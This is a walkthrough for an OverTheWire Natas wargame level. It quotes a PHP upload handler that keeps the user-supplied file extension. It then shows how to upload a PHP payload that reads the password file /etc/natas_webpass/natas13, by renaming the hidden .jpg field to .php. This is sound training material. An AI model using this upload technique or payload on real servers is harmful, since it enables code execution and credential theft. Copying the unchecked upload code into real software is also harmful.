# Natas 12 -> 13

```
http://natas12.natas.labs.overthewire.org
```

```
Username: natas12
```

We have a form to upload a JPEG file with max. size of 1KB. Also the source code.

```php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<? } 
```

After a quick glance, there's no sign that it verifies that we're uploadin an actual JPEG file.  
Let's see the value of `getRandomString()` by looking at the source of the page with `firebug` or `dev-tools`.  

We need to read `/etc/natas_webpass/natas13`, so let's try uploading a PHP file with something that reads files: 

```php
<?php
var_dump(file_get_contents('/etc/natas_webpass/natas13'));
```

Before uploading it, see that field with `getRandomString()`? It adds a `.jpg` extension, use `firebug` or `dev-tools` to fix that :-)


* php
* file_get_contents
